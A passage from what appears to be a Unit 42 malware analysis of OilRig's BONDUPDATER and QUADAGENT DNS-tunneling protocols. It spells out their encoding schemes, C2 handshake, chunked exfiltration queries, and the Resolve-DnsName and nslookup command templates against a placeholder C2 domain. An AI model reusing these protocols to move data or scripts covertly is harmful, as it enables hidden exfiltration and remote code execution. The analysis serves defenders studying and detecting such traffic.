data-line="crayon-5f692892e1b85558242571-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-32">32</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-34">34</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-36">36</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-38">38</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f692892e1b85558242571-40">40</div><div class="crayon-num" data-line="crayon-5f692892e1b85558242571-41">41</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692892e1b85558242571-1"><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">encode</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">10100</span><span class="crayon-o">*</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-2">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-3"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-4">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-5"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'3'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-6">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-7"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-8">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-9"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-10">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-11"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'3'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-12">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-13"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-14">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-15"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-16">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-17"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'3'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-18">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-19"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-20">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-21"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-22">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-23"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'3'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-24">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-25"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-26">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-27"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-28">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-29"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'3'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-30">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-31"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'0'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-32">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-33"><span class="crayon-t">Char</span><span class="crayon-h"> </span><span class="crayon-s">'*'</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-cn">2A</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">hex</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-34">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-35"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'2'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-36">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-37"> <span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-i">Put</span><span class="crayon-h"> </span><span class="crayon-s">'A'</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-38">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-39"><span class="crayon-e">Concat </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span>“<span class="crayon-cn">333332</span>”<span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span>“<span class="crayon-cn">10100A</span>”</div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b85558242571-40">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b85558242571-41"><span class="crayon-e">Encoded </span><span class="crayon-t">string</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">33333210100A</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p></p>
<p style="text-align: left;">The data segment of the subdomain can be a maximum of 60 characters long, so BONDUPDATER will split the data to exfiltrate into 30-byte chunks and encode the data using the same encoding method. To initiate the exfiltration of this file with the C2, BONDUPDATER will issue an initial DNS A query for a domain whose data chunk section starts with a hardcoded “COCTab” string followed by an encoded string of data that contains the filename and the length of the encoded data that will be transmitted. For instance, the “10100” file used in our example stored 2795 bytes of output from the issued command, which results in 5590 bytes when encoded. The Trojan splits the filename and data size with an asterisk and uses asterisks as padding to create a 27-character string of  “<span style="font-family: 'courier new', courier, monospace;">10100*5590*****************</span>”, which results in an encoded string “<span style="font-family: 'courier new', courier, monospace;">33333233332222222222222222210100A5590AAAAAAAAAAAAAAAAA</span>”. BONDUPDATER appends this encoded string to “COCTab” and issues a DNS query using this as its data segment of the subdomain to notify the C2 how many DNS A requests it will issue to transmit the data. Figure 28 shows the initial notification query that contains the “33333210100A” string in the filename segment and the data segment containing the filename and data length string after “COCTab”.<img class="alignnone size-full wp-image-96641" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28.png" alt="" width="947" height="79" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28.png 947w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28-900x75.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28-300x25.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28-768x64.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure28-370x31.png 370w" sizes="(max-width: 947px) 100vw, 947px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 28. BONDUPDATER query notifying the C2 that it will upload the contents of a file</span></em></p>
<p>The C2 server will respond to this DNS A request with an IPv4 address that contains the first two characters of the GUID used as the system identifier as the first octet, “2” and “3” as the second and third octet and the fourth octet containing a sequence number corresponding to the data chunk that the C2 server wishes the Trojan to send. BONDUPDATER will continue to send DNS A queries with chunks of encoded data from the file within the data segment of the subdomain until all of the data has been transmitted. Figure 29 shows the C2 server responding to the notification query and the following data transfer queries with the IPv4 addresses whose fourth octet increments by three to obtain the next chunk of data.</p>
<p><img class="alignnone size-full wp-image-96642" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29.png" alt="" width="974" height="152" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29-900x140.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29-300x47.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29-768x120.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure29-370x58.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 29. BONDUPDATER transmitting data to the C2 in the queried subdomains</em></span></p>
<p><em> </em>After sending all of the data, the Trojan will issue a final DNS query with “COCTabCOCT” in the data segment. This query notifies the C2 server that the Trojan has finished sending the contents of the file. Figure 30 shows the continued data transfer via DNS queries, followed by the final DNS query with “COCTabCOCT” within the data segment.<em> <img class="alignnone size-full wp-image-96643" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30.png" alt="" width="979" height="156" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30.png 979w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30-900x143.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30-300x48.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30-768x122.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure30-370x59.png 370w" sizes="(max-width: 979px) 100vw, 979px" /></em></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 30. BONDUPDATER sending data and telling the C2 it is done via the &#8220;COCTabCOCT&#8221; string</em></span></p>
<h1>QUADAGENT</h1>
<p>OilRig has used the QUADAGENT tool in targeted attacks, one of which we publicly discussed in our blog titled <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/">OilRig Targets Technology Service Provider and Government Agency with QUADAGENT</a>. QUADAGENT is capable of using DNS tunneling to communicate with its C2 server using DNS queries to resolve custom crafted subdomains of a C2 domain. The DNS tunneling protocol uses AAAA queries to transmit and receive data between the infected system and its C2 server. Depending on the version of Windows, the payload will use a different method to issue the queries, specifically:</p>
<p><strong>Windows 8+</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">Resolve-DnsName -Name &lt;generated subdomain&gt;.&lt;c2 domain&gt; -Type AAAA -DnsOnly</span></p>
<p><strong>Windows 7</strong></p>
<p><span style="font-family: 'courier new', courier, monospace;">nslookup.exe -q=aaaa &lt;generated subdomain&gt;.&lt;c2 domain&gt;.</span></p>
<p>It appears that the author knew that PowerShell on Windows versions prior to Windows 8.1 did not have the DnsClient module that contains the Resolve-DnsName method. At a high level, QUADAGENT communicates with its C2 server to obtain a PowerShell script that it will replace itself with, which essentially updates the Trojan with a secondary payload. To carry out this updating functionality, QUADAGENT follows a sequence of steps that involves:</p>
<ol>
<li>Obtaining a session identifier and pre-shared key</li>
<li>Confirming the correct session identifier</li>
<li>Downloading the PowerShell script</li>
<li>Confirming the download and execution</li>
</ol>
<p>The first step to set up communications between QUADAGENT and the C2 involves an initial handshake to obtain a session ID and pre-shared key. To obtain its session id and pre-shared key, the payload will issue a query to resolve the following domain, which acts as the initial beacon:</p>
<p><span style="font-family: 'courier new', courier, monospace;">mail.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>This request is to notify the C2 server that the payload is about to send system specific data as part of the initial handshake. The system specific data sent to the C2 server is in the following format:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;domain&gt;\&lt;username&gt;:pass</span></p>
<p>The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (&#8220;=&#8221;,&#8221;/&#8221; and &#8220;+&#8221;) from the data and replaces them with domain safe values (&#8220;01&#8221;, &#8220;02&#8221; and &#8220;03&#8221; respectively). QUADAGENT will issue a DNS query to resolve a domain with the following structure to send this encoded system data to the C2:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;encoded system data&gt;.&lt;same random number between 100000 and 999999 above&gt;.&lt;c2 name&gt;</span></p>
<p>The C2 server will respond to these requests by providing a session identifier to uniquely identify the compromised system and pre-shared key encrypt data sent via the DNS tunnel. To transfer this data to QUADAGENT, the C2 server will respond to the last DNS query with an IPv6 address that contains a number that the Trojan will use to determine how many DNS requests it must issue to download the data from the C2 server. The C2 server will send the count value in the last two hexadectets of the IPv6 address in the answer to the query. Figure 31 shows QUADAGENT sending a query to notify the C2 that it will send system specific data in the following query. The C2 response has “2” in the last two hexadectets, which instructs the Trojan to issue two queries to download the desired data.</p>
<p><img class="alignnone size-full wp-image-96644" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31.png" alt="" width="977" height="112" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31.png 977w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31-900x103.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31-300x34.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31-768x88.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure31-370x42.png 370w" sizes="(max-width: 977px) 100vw, 977px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 31. Wireshark displaying beacon and transmission of system information between QUADAGENT and its C2</span></em></p>
<p>To receive the data, QUADAGENT will issue DNS requests to resolve subdomains of the C2 domain that start with “www” followed immediately by a sequence number of the chunk of data the Trojan currently seeks. The Trojan will issue queries to resolve the domains with the following structure until it has reached the count value provided by the C2 in Figure 31:</p>
<p><span style="font-family: 'courier new', courier, monospace;">www&lt;sequence number&gt;.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>After obtaining the data, QUADAGENT will issue a query to resolve a subdomain structured as follows to signal to the C2 server that it received all of the data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">www.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>Figure 32 shows QUADAGENT issuing DNS requests with incrementing sequence numbers and the C2 providing the session identifier and pre-shared key within the IPv6 answers. The screenshot also shows the Trojan sending a DNS query to notify the C2 that it successfully received the data.</p>
<p><img class="alignnone size-full wp-image-96645" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32.png" alt="" width="968" height="135" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32.png 968w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32-900x126.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32-300x42.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32-768x107.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure32-370x52.png 370w" sizes="(max-width: 968px) 100vw, 968px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 32. Wireshark displaying QUADAGENT downloading a session identifier and pre-shared key from C2</span></em></p>
<p>QUADAGENT will then finish the handshake sequence by using its newly obtained session identifier in a series of queries. The Trojan will use a similar series of queries later on to exfiltrate data to the C2 later in its communications, but at this point in the communications QUADAGENT just uses them to echo the session identifier back to the C2. The payload starts this process by issuing a DNS query to resolve a domain with the following structure to notify the C2 that it is about to send data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">ns1.&lt;new random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>QUADAGENT does nothing with the answer to the previous query, rather it immediately issues a query to resolve the following domain, which effectively transmits the session id value to the C2:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;session id&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;</span></p>
<p>Once again, the payload disregards the answer to the query above. At this point, if QUADAGENT had data to the C2, it would encrypt the data and encode the ciphertext using the custom base64 function used to transmit the system information within the handshake. The Trojan would then send this encoded data within a sequence of queries that include 60 characters of the encoded ciphertext as the first portion of the subdomain. After completing the data transmission, QUADAGENT then issues one last query to resolve a domain with “ns2” as the subdomain to notify the C2 server that it is done sending data. At this point in the communications, QUADAGENT does not have any data to send to the C2, as it is only echoing the session identifier so the Trojan issues a query to resolve a domain structured as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">ns2.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;</span></p>
<p>Figure 33 shows QUADAGENT sending the provided session identifier to the C2 server.</p>
<p><img class="alignnone size-full wp-image-96646" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33.png" alt="" width="977" height="139" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33.png 977w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33-900x128.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33-300x43.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33-768x109.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure33-370x53.png 370w" sizes="(max-width: 977px) 100vw, 977px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 33. Wireshark showing QUADAGENT echoing its session identifier back to the C2</em></span></p>
<p>To transmit the data via the DNS tunneling channel, the C2 server will respond to the previous query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers. This is the same process discussed earlier when the C2 server provided the session identifier and pre-shared key. Much like the data transfer method discussed earlier, QUADAGENT will issue DNS requests to resolve subdomains “<span style="font-family: 'courier new', courier, monospace;">www&lt;sequence number&gt;</span>” with the sequence number incrementing until it receives all the data. Once it receives all the data, the Trojan issues a query to resolve “<span style="font-family: 'courier new', courier, monospace;">www.</span>” to notify the C2 that it received all the data.</p>
<p>The C2 can respond to the query to resolve the “<span style="font-family: 'courier new', courier, monospace;">ns2.</span>” domain with pipe-delimited (“|”) data that QUADAGENT will parse and handle in one of two ways depending on fields provided. The Trojan will parse the two types of data and treat them as:</p>
<ul>
<li>A new session identifier and pre-shared key</li>
<li>A command to overwrite the current script with a new PowerShell script to execute</li>
</ul>
<p>First, the C2 can provide data with a specific structure that QUADAGENT will treat as a new session identifier and pre-shared key. Much like the initial handshake, QUADAGENT will save this session identifier and pre-shared key to the registry so the Trojan does not have to carry out the handshake each time it executes. The C2 creates a string following structure and sending it to QUADAGENT as cleartext via IPv6 addresses in the “<span style="font-family: 'courier new', courier, monospace;">www&lt;sequence number&gt;</span>” query sequence:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;session identifier&gt;|&lt;length of pre-shared key&gt;|&lt;pre-shared key&gt;</span></p>
<p>Second, the C2 can provide data that QUADAGENT will treat as a command that it will parse looking for data to overwrite its current file with a new PowerShell script. The C2 provides this data by creating a string with the field before the first pipe (“|”) empty, the second field containing the length of the ciphertext and the third field starting with the 16-byte initialization vector (IV) followed by the data encrypted with AES using the previously mentioned IV and the pre-shared key. This data is sent to the Trojan via the “<span style="font-family: 'courier new', courier, monospace;">www&lt;sequence number&gt;</span>” query sequence in the following format:</p>
<p><span style="font-family: 'courier new', courier, monospace;">|&lt;length of encrypted data&gt;|&lt;AES IV&gt;&lt;Data encrypted with AES and pre-shared key&gt;</span></p>
<p>Figure 34 shows the C2 server instructing QUADAGENT to issue 5 requests to download data. QUADAGENT issues these queries and increments the sequence number in each query. The C2 server provides answers to these queries with the length of the data, the 16-byte AES initialization vector and the data encrypted with AES using the pre-shared key.</p>
<p><img class="alignnone size-full wp-image-96647" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34.png" alt="" width="970" height="233" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34.png 970w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34-900x216.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34-300x72.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34-768x184.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure34-370x89.png 370w" sizes="(max-width: 970px) 100vw, 970px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 34. Wireshark displaying QUADAGENT downloading a command from the C2 server</em></span></p>
<p>QUADAGENT will decrypt the data downloaded from the C2 server using AES with the provided IV and the previously provided pre-shared key. QUADAGENT will parse the decrypted data based on the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">hello&lt;char uuid[35]&gt;&lt;char type[1]&gt;&lt;data&gt;</span></p>
<p>The message will start with the string &#8216;hello&#8217;, followed by a 35 character UUID string. The &#8216;type&#8217; field specifies the command that the payload will handle, which known QUADAGENT samples can only handle one command type &#8216;x&#8217;. The &#8216;x&#8217; command treats the supplied data field as a PowerShell script that it will write to the current PowerShell script, effectively overwriting the initial PowerShell script with a secondary payload.</p>
<p>The payload will then notify the C2 that it has successfully downloaded the secondary PowerShell payload. The payload creates a string that has the following structure that it will send to the C2:</p>
<p><span style="font-family: 'courier new', courier, monospace;">bye&lt;char uuid[35]&gt;d</span></p>
<p>QUADAGENT will send the above string to the C2 using the sequence of DNS queries previously mentioned for data exfiltration. The sequence starts by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:</p>
<p><span style="font-family: 'courier new', courier, monospace;">ns1.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>QUADAGENT will then issue a query to resolve a subdomain structured as follows, which contains the session identifier that notifies the C2 which host is about to send data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;session id&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;</span></p>
<p>The payload will then split the message up into 60-byte chunks, which it will send to the C2 via DNS queries to resolve domains structured as:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;encoded/encrypted data of message&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>The payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:</p>
<p><span style="font-family: 'courier new', courier, monospace;">ns2.&lt;same random number between 100000 and 999999&gt;.&lt;c2 name&gt;</span></p>
<p>Figure 35 shows QUADAGENT uploading data to the C2 server as base64 encoded data within the queried subdomain. Before sending the data, the Trojan provides the notification query using the “ns1” subdomain, followed by a query with the session identifier. Finally, QUADAGENT issues a query for the “ns2” subdomain to notify the C2 that it is done sending data.</p>
<p><img class="alignnone size-full wp-image-96648" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35.png" alt="" width="999" height="181" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35.png 999w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35-900x163.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35-300x54.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35-768x139.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure35-370x67.png 370w" sizes="(max-width: 999px) 100vw, 999px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 35. Wireshark displaying QUADAGENT sending its &#8220;bye&#8221; message to the C2 server</span></em></p>
<h1>Conclusion</h1>
<p>The OilRig group has repeatedly used DNS tunneling as a channel to communicate between their C2 servers and many of their tools. As mentioned in our <a href="https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/">overview of DNS tunneling</a>, this threat group saw the benefits of using DNS tunneling, as DNS is almost universally allowed through security devices. One major drawback of using DNS tunneling is the high volume of DNS queries issued to transmit data back and forth between the tool and the C2 server, which may stand out to those monitoring DNS activity on their networks.</p>
<p>While all DNS tunneling protocols have to abide by the standardized DNS protocol, not all of the tunneling protocols used by OilRig are equal from an efficiency or blending in standpoint. Data transmission using these DNS tunnels uses specially crafted subdomains, which can transmit more data per query by designating more of the characters within the subdomain as data. It is also obvious that the use of base64 encoding is more efficient than base16 in these protocols, as each character of base64 encoded data can send .75 bytes of data whereas base16 requires two characters to send 1 byte. Regardless of the encoding, the extremely long subdomains used in some of these tunnels to transmit data may not blend into legitimate DNS query traffic.</p>
<p>Palo Alto Networks customers interested in protecting themselves against DNS Tunneling attacks should investigate our <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security">DNS Security Service</a>, which uses advanced techniques to identify and block DNS Tunneling attacks.</p>
<p><span style="font-size: 10pt;">Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.</span></p>
<p><span style="font-size: 18pt;">IOCs</span></p>
<p>While not an exhaustive list of samples, please reference the following SHA256 hashes for the various tools discussed in this blog.</p>
